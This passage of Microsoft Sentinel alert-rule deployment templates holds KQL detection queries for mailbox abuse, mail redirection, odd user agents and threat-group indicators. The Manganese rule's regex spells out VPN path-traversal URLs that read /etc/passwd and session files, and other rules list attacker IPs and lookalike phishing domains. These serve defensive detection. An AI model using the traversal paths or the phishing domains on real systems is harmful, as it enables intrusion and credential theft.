          "query": "let timeframe = 1d;\nlet Keywords = dynamic([\"helpdesk\", \" alert\", \" suspicious\", \"fake\", \"malicious\", \"phishing\", \"spam\", \"do not click\", \"do not open\", \"hijacked\", \"Fatal\"]);\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where Operation =~ \"New-InboxRule\"\n| where Parameters has \"Deleted Items\" or Parameters has \"Junk Email\" \n| extend Events=todynamic(Parameters)\n| parse Events  with * \"SubjectContainsWords\" SubjectContainsWords '}'*\n| parse Events  with * \"BodyContainsWords\" BodyContainsWords '}'*\n| parse Events  with * \"SubjectOrBodyContainsWords\" SubjectOrBodyContainsWords '}'*\n| where SubjectContainsWords has_any (Keywords)\n or BodyContainsWords has_any (Keywords)\n or SubjectOrBodyContainsWords has_any (Keywords)\n| extend ClientIPAddress = case( ClientIP has \".\", tostring(split(ClientIP,\":\")[0]), ClientIP has \"[\", tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))), ClientIP )\n| extend Keyword = iff(isnotempty(SubjectContainsWords), SubjectContainsWords, (iff(isnotempty(BodyContainsWords),BodyContainsWords,SubjectOrBodyContainsWords )))\n| extend RuleDetail = case(OfficeObjectId contains '/' , tostring(split(OfficeObjectId, '/')[-1]) , tostring(split(OfficeObjectId, '\\\\')[-1]))\n| summarize count(), StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by  Operation, UserId, ClientIPAddress, ResultStatus, Keyword, OriginatingServer, OfficeObjectId, RuleDetail\n| extend timestamp = StartTimeUtc,  IPCustomEntity = ClientIPAddress, AccountCustomEntity = UserId , HostCustomEntity =  OriginatingServer",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1098",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "7b907bf7-77d4-41d0-a208-5643ff75bf9a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9c6d5bdb-8818-4351-9de5-ffb25e0ea8d0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9c6d5bdb-8818-4351-9de5-ffb25e0ea8d0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Mail redirect via ExO transport rule",
          "description": "Identifies when Exchange Online transport rule configured to forward emails.\nThis could be an adversary mailbox configured to collect mail from multiple user accounts.",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeframe = 1d;\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where OfficeWorkload == \"Exchange\"\n| where Operation in~ (\"New-TransportRule\", \"Set-TransportRule\")\n| extend p = parse_json(Parameters)\n| extend RuleName = case(\n  Operation =~ \"Set-TransportRule\", tostring(OfficeObjectId),\n  Operation =~ \"New-TransportRule\", tostring(p[1].Value),\n  \"Unknown\"\n  ) \n| mvexpand p\n| where (p.Name =~ \"BlindCopyTo\" or p.Name =~ \"RedirectMessageTo\") and isnotempty(p.Value)\n| extend RedirectTo = p.Value\n| extend ClientIPOnly = case( \n  ClientIP has \".\" and ClientIP has \":\", tostring(split(ClientIP,\":\")[0]), \n  ClientIP has \".\" and ClientIP has \"-\", tostring(split(ClientIP,\"-\")[0]), \n  ClientIP has \"[\", tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))),\n  ClientIP\n  )  \n| extend Port = case(\n  ClientIP has \".\" and ClientIP has \":\", (split(ClientIP,\":\")[1]),\n  ClientIP has \".\" and ClientIP has \"-\", (split(ClientIP,\"-\")[1]),\n  ClientIP has \"[\" and ClientIP has \":\", tostring(split(ClientIP,\"]:\")[1]),\n  ClientIP has \"[\" and ClientIP has \"-\", tostring(split(ClientIP,\"]-\")[1]),\n  ClientIP\n  )\n| extend ClientIP = ClientIPOnly\n| project TimeGenerated, RedirectTo, ClientIP, Port, UserId, Operation, RuleName\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserId, IPCustomEntity = ClientIP",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection",
            "Exfiltration"
          ],
          "techniques": [
            "T1114",
            "T1020"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "500415fb-bba7-4227-a08a-9857fb61b6a7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/11214ad8-17ae-4a28-b0e7-077684f0e2f4')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/11214ad8-17ae-4a28-b0e7-077684f0e2f4')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Malformed user agent",
          "description": "Malware authors will sometimes hardcode user agent string values when writing the network communication component of their malware.\nMalformed user agents can be an indication of such malware.",
          "severity": "Medium",
          "enabled": true,
          "query": "let endtime = 1d;\n(union isfuzzy=true\n(OfficeActivity | where TimeGenerated >= ago(endtime) | where UserAgent != \"\"),\n(OfficeActivity\n| where TimeGenerated >= ago(endtime)\n| where RecordType in (\"AzureActiveDirectoryAccountLogon\", \"AzureActiveDirectoryStsLogon\")\n| extend OperationName = Operation, UserAgent = extractjson(\"$[0].Value\", ExtendedProperties, typeof(string))),\n(AzureDiagnostics\n| where TimeGenerated >= ago(endtime)\n| where ResourceType =~ \"APPLICATIONGATEWAYS\" \n| where OperationName =~ \"ApplicationGatewayAccess\" \n| extend ClientIP = columnifexists(\"clientIP_s\", \"None\"), UserAgent = columnifexists(\"userAgent_s\", \"None\")))\n// Likely artefact of hardcoding\n| where UserAgent startswith \"User\" or UserAgent startswith \"\\\"\"\n// Incorrect casing\nor (UserAgent startswith \"Mozilla\" and not(UserAgent containscs \"Mozilla\"))\n// Incorrect casing\nor UserAgent containscs  \"(Compatible;\"\n// Missing MSIE version\nor UserAgent matches regex @\"MSIE\\s?;\"\n// Incorrect spacing around MSIE version\nor UserAgent matches regex  @\"MSIE(?:\\d|.{1,5}?\\d\\s;)\"\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), OperationNames = makeset(OperationName), UserAgentCount = dcount(UserAgent), \nUserAgentList = makeset(UserAgent), RecordTypes = makeset(RecordType) by UserId, ClientIP\n| extend timestamp = StartTimeUtc, IPCustomEntity = ClientIP, AccountCustomEntity = UserId",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CommandAndControl",
            "Execution"
          ],
          "techniques": [
            "T1189",
            "T1071",
            "T1203"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a357535e-f722-4afe-b375-cff362b2b376",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/08c42ce1-f0dc-4041-ae83-0b3e911eb295')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/08c42ce1-f0dc-4041-ae83-0b3e911eb295')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SharePointFileOperation via devices with previously unseen user agents",
          "description": "Identifies if the number of documents uploaded or downloaded from device(s) associated\nwith a previously unseen user agent exceeds a threshold (default is 5).",
          "severity": "Medium",
          "enabled": true,
          "query": "let threshold = 5;\nlet szSharePointFileOperation = \"SharePointFileOperation\";\nlet szOperations = dynamic([\"FileDownloaded\", \"FileUploaded\"]);\nlet starttime = 14d;\nlet endtime = 1d;\nlet historicalActivity =\nOfficeActivity\n| where TimeGenerated between(ago(starttime)..ago(endtime))\n| where RecordType =~ szSharePointFileOperation\n| where Operation in~ (szOperations)\n| where isnotempty(UserAgent)\n| summarize historicalCount = count() by UserAgent, RecordType, Operation;\nlet recentActivity = OfficeActivity\n| where RecordType =~ szSharePointFileOperation\n| where Operation in~ (szOperations)\n| where TimeGenerated > ago(endtime)\n| where isnotempty(UserAgent)\n| summarize min(Start_Time), max(Start_Time), recentCount = count() by UserAgent, RecordType, Operation;\nlet RareUserAgent = recentActivity | join kind = leftanti (historicalActivity) on UserAgent\n| order by recentCount desc, UserAgent\n// More than 3 downloads/uploads from a new user agent today\n| where recentCount > threshold;\nOfficeActivity \n| where TimeGenerated > ago(endtime) \n| where RecordType =~ szSharePointFileOperation \n| where Operation in~ (szOperations)\n| where isnotempty(UserAgent)\n| join kind= inner (RareUserAgent)\non UserAgent, RecordType, Operation    \n| where Start_Time between(min_Start_Time .. max_Start_Time)\n| summarize StartTimeUtc = min(min_Start_Time), EndTimeUtc = max(max_Start_Time) by RecordType, Operation, UserAgent, UserType, UserId, ClientIP, OfficeWorkload, Site_Url, OfficeObjectId, UserAgentSeenCount = recentCount\n| extend timestamp = StartTimeUtc, AccountCustomEntity = UserId, IPCustomEntity = ClientIP, URLCustomEntity = Site_Url\n| order by UserAgentSeenCount desc, UserAgent asc, Operation asc, UserId asc",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1030"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "5dd76a87-9f87-4576-bab3-268b0e2b338b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "URLCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8605a495-c989-4d6e-bd5a-ad4e6d65fbaa')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8605a495-c989-4d6e-bd5a-ad4e6d65fbaa')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known Manganese IP and UserAgent activity",
          "description": "Matches IP plus UserAgent IOCs in OfficeActivity data, along with IP plus Connection string information in the CommonSecurityLog data related to Manganese group activity.\nReferences: \nhttps://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/\nhttps://fortiguard.com/psirt/FG-IR-18-384",
          "severity": "High",
          "enabled": true,
          "query": "let timeframe = 1d;\nlet IPList = dynamic([\"45.63.52.41\",\"140.82.17.161\",\"207.148.101.95\",\"45.32.87.51\",\"66.42.98.156\",\"45.76.144.105\",\"217.163.28.35\",\"45.32.141.174\",\"149.28.165.249\",\"209.250.225.247\",\"45.63.100.115\",\"95.179.229.230\",\"209.250.233.247\",\"45.77.121.232\",\"45.76.175.65\",\"104.238.160.237\",\"45.77.181.97\",\"95.179.192.125\",\"149.28.93.184\",\"140.82.16.81\",\"45.76.173.103\",\"45.77.255.22\",\"45.32.11.71\",\"149.28.77.26\",\"45.32.54.50\",\"104.156.233.156\",\"45.32.21.118\",\"45.63.62.109\",\"45.77.244.202\",\"149.248.11.205\",\"104.238.190.244\"]);\nlet IOCTerms = \"\\\\?lang=[/..]*/dev/cmdb/sslvpn_websession|/dana-na/jam/[/..]*home/webserver/htdocs/dana/html5acc/guacamole[/..]*etc/passwd\\\\?\";\n(union isfuzzy=true\n(CommonSecurityLog\n| where TimeGenerated >= ago(1d) \n| where isnotempty(SourceIP) or isnotempty(DestinationIP)\n| where SourceIP in (IPList) or DestinationIP in (IPList) or Message has_any (IPList)\n| extend IPMatch = case(\nSourceIP in (IPList), \"SourceIP\", \nDestinationIP in (IPList), \"DestinationIP\",\n\"Message\") \n| where Message matches regex IOCTerms\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by SourceIP, DestinationIP, DeviceProduct, DeviceAction, Message, Protocol, SourcePort, DestinationPort, DeviceAddress, DeviceName, IPMatch\n| extend timestamp = StartTimeUtc, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"IP in Message Field\") \n),\n(OfficeActivity\n| where TimeGenerated >= ago(1d) \n| where isnotempty(UserAgent) and ClientIP in (IPList)\n| where UserAgent contains \"ExchangeServicesClient/0.0.0.0\"\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by SourceIP = ClientIP, Account = UserId, Type, RecordType, OfficeWorkload, UserAgent, OfficeObjectId, IPMatch = \"ClientIP\"\n| extend timestamp = StartTimeUtc, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n)\n)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1133",
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a04cf847-a832-4c60-b687-b0b6147da219",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/28d7e198-4b84-43f7-8095-1e5470c3a607')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/28d7e198-4b84-43f7-8095-1e5470c3a607')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known IRIDIUM IP",
          "description": "IRIDIUM command and control IP. Identifies a match across various data feeds for IP IOCs related to the IRIDIUM activity group.",
          "severity": "High",
          "enabled": true,
          "query": "let timeframe = 1d;\nlet IPList = dynamic([\"154.223.45.38\",\"185.141.207.140\",\"185.234.73.19\",\"216.245.210.106\",\"51.91.48.210\",\"46.255.230.229\"]);\n(union isfuzzy=true\n(CommonSecurityLog\n| where TimeGenerated >= ago(timeframe) \n| where isnotempty(SourceIP) or isnotempty(DestinationIP)\n| where SourceIP in (IPList) or DestinationIP in (IPList) or Message has_any (IPList)\n| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"Message\") \n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by SourceIP, DestinationIP, DeviceProduct, DeviceAction, Message, Protocol, SourcePort, DestinationPort, DeviceAddress, DeviceName, IPMatch\n| extend timestamp = StartTimeUtc, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"IP in Message Field\") \n),\n(OfficeActivity\n| where TimeGenerated >= ago(timeframe) \n|extend SourceIPAddress = ClientIP, Account = UserId\n| where  SourceIPAddress in (IPList)\n| extend timestamp = TimeGenerated , IPCustomEntity = SourceIPAddress , AccountCustomEntity = Account\n),\n(DnsEvents \n| where TimeGenerated >= ago(timeframe) \n| extend DestinationIPAddress = IPAddresses,  Host = Computer\n| where  DestinationIPAddress has_any (IPList) \n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIPAddress, HostCustomEntity = Host\n),\n(VMConnection \n| where TimeGenerated >= ago(timeframe) \n| where isnotempty(SourceIp) or isnotempty(DestinationIp) \n| where SourceIp in (IPList) or DestinationIp in (IPList) \n| extend IPMatch = case( SourceIp in (IPList), \"SourceIP\", DestinationIp in (IPList), \"DestinationIP\", \"None\") \n| extend timestamp = TimeGenerated , IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIp, IPMatch == \"DestinationIP\", DestinationIp, \"None\"), Host = Computer\n),\n(Event\n| where TimeGenerated >= ago(timeframe)\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 3\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend SourceIP = EventDetail.[9].[\"#text\"], DestinationIP = EventDetail.[14].[\"#text\"]\n| where SourceIP in (IPList) or DestinationIP in (IPList) \n| extend IPMatch = case( SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"None\") \n| extend timestamp = TimeGenerated, AccountCustomEntity = UserName, HostCustomEntity = Computer , IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"None\")\n), \n(WireData \n| where TimeGenerated >= ago(timeframe)\n| where isnotempty(RemoteIP)\n| where RemoteIP in (IPList)\n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = Computer\n),\n(SigninLogs\n| where TimeGenerated >= ago(timeframe)\n| where isnotempty(IPAddress)\n| where IPAddress in (IPList)\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress\n),\n(W3CIISLog \n| where TimeGenerated >= ago(timeframe)\n| where isnotempty(cIP)\n| where cIP in (IPList)\n| extend timestamp = TimeGenerated, IPCustomEntity = cIP, HostCustomEntity = Computer, AccountCustomEntity = csUserName\n),\n(AzureActivity \n| where TimeGenerated >= ago(timeframe)\n| where isnotempty(CallerIpAddress)\n| where CallerIpAddress in (IPList)\n| extend timestamp = TimeGenerated, IPCustomEntity = CallerIpAddress, AccountCustomEntity = Caller\n),\n(\nAWSCloudTrail\n| where TimeGenerated >= ago(timeframe)\n| where isnotempty(SourceIpAddress)\n| where SourceIpAddress in (IPList)\n| extend timestamp = TimeGenerated, IPCustomEntity = SourceIpAddress, AccountCustomEntity = UserIdentityUserName\n)\n)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "7ee72a9e-2e54-459c-bc8a-8c08a6532a63",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d8f512f5-d175-4c19-a0be-55319a9e2e20')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d8f512f5-d175-4c19-a0be-55319a9e2e20')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known Phosphorus group domains/IP",
          "description": "Matches domain name IOCs related to Phosphorus group activity with CommonSecurityLog, DnsEvents, OfficeActivity and VMConnection dataTypes.\nReferences: https://blogs.microsoft.com/on-the-issues/2019/03/27/new-steps-to-protect-customers-from-hacking/.",
          "severity": "High",
          "enabled": true,
          "query": "let timeframe = 1d;\nlet DomainNames = dynamic([\"yahoo-verification.org\",\"support-servics.com\",\"verification-live.com\",\"com-mailbox.com\",\"com-myaccuants.com\",\"notification-accountservice.com\",\n\"accounts-web-mail.com\",\"customer-certificate.com\",\"session-users-activities.com\",\"user-profile-credentials.com\",\"verify-linke.com\",\"support-servics.net\",\"verify-linkedin.net\", \n\"yahoo-verification.net\",\"yahoo-verify.net\",\"outlook-verify.net\",\"com-users.net\",\"verifiy-account.net\",\"te1egram.net\",\"account-verifiy.net\",\"myaccount-services.net\",\n\"com-identifier-servicelog.name\",\"microsoft-update.bid\",\"outlook-livecom.bid\",\"update-microsoft.bid\",\"documentsfilesharing.cloud\",\"com-microsoftonline.club\",\n\"confirm-session-identifier.info\",\"session-management.info\",\"confirmation-service.info\",\"document-share.info\",\"broadcast-news.info\",\"customize-identity.info\",\"webemail.info\",\n\"com-identifier-servicelog.info\",\"documentsharing.info\",\"notification-accountservice.info\",\"identifier-activities.info\",\"documentofficupdate.info\",\"recoveryusercustomer.info\",\n\"serverbroadcast.info\",\"account-profile-users.info\",\"account-service-management.info\",\"accounts-manager.info\",\"activity-confirmation-service.info\",\"com-accountidentifier.info\",\n\"com-privacy-help.info\",\"com-sessionidentifier.info\",\"com-useraccount.info\",\"confirmation-users-service.info\",\"confirm-identity.info\",\"confirm-session-identification.info\",\n\"continue-session-identifier.info\",\"customer-recovery.info\",\"customers-activities.info\",\"elitemaildelivery.info\",\"email-delivery.info\",\"identify-user-session.info\",\n\"message-serviceprovider.info\",\"notificationapp.info\",\"notification-manager.info\",\"recognized-activity.info\",\"recover-customers-service.info\",\"recovery-session-change.info\",\n\"service-recovery-session.info\",\"service-session-continue.info\",\"session-mail-customers.info\",\"session-managment.info\",\"session-verify-user.info\",\"shop-sellwear.info\",\n\"supportmailservice.info\",\"terms-service-notification.info\",\"user-activity-issues.info\",\"useridentity-confirm.info\",\"users-issue-services.info\",\"verify-user-session.info\",\n\"login-gov.info\",\"notification-signal-agnecy.info\",\"notifications-center.info\",\"identifier-services-sessions.info\",\"customers-manager.info\",\"session-manager.info\",\n\"customer-managers.info\",\"confirmation-recovery-options.info\",\"service-session-confirm.info\",\"session-recovery-options.info\",\"services-session-confirmation.info\",\n\"notification-managers.info\",\"activities-services-notification.info\",\"activities-recovery-options.info\",\"activity-session-recovery.info\",\"customers-services.info\",\n\"sessions-notification.info\",\"download-teamspeak.info\",\"services-issue-notification.info\",\"microsoft-upgrade.mobi\",\"broadcastnews.pro\",\"mobile-messengerplus.network\"]);\nlet IPList = dynamic([\"51.91.200.147\"]);\nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\n(union isfuzzy=true\n(CommonSecurityLog \n| where TimeGenerated >= ago(timeframe)\n| parse Message with * '(' DNSName ')' * \n| extend MessageIP = extract(IPRegex, 0, Message)\n| extend RequestURLIP = extract(IPRegex, 0, Message)\n| where (isnotempty(SourceIP) and SourceIP in (IPList)) or (isnotempty(DestinationIP) and DestinationIP in (IPList)) \nor (isnotempty(DNSName) and DNSName in~ (DomainNames)) or (isnotempty(DestinationHostName) and DestinationHostName in~ (DomainNames)) or (isnotempty(RequestURL) and (RequestURL has_any (DomainNames) or RequestURLIP in (IPList))) \nor (isnotempty(Message) and MessageIP in (IPList))\n| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", MessageIP in (IPList), \"Message\", RequestURLIP in (IPList), \"RequestUrl\", \"NoMatch\") \n| extend timestamp = TimeGenerated , IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP,IPMatch == \"Message\", MessageIP,\nIPMatch == \"RequestUrl\", RequestURLIP,\"NoMatch\"), Account = SourceUserID, Host = DeviceName\n),\n(DnsEvents \n| where TimeGenerated >= ago(timeframe) \n| extend DestinationIPAddress = IPAddresses, DNSName = Name, Host = Computer\n| where  DestinationIPAddress in (IPList) or DNSName in~ (DomainNames) \n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIPAddress, HostCustomEntity = Host),\n(VMConnection \n| where TimeGenerated >= ago(timeframe) \n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| where isnotempty(SourceIP) or isnotempty(DestinationIP) or isnotempty(DNSName)\n| where SourceIP in (IPList) or DestinationIP in (IPList) or DNSName in~ (DomainNames)\n| extend IPMatch = case( SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"None\") \n| extend timestamp = TimeGenerated , IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"None\"), Host = Computer),\n(OfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| extend SourceIPAddress = ClientIP, Account = UserId\n| where  SourceIPAddress in (IPList)\n| extend timestamp = TimeGenerated , IPCustomEntity = SourceIPAddress , AccountCustomEntity = Account )\n)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
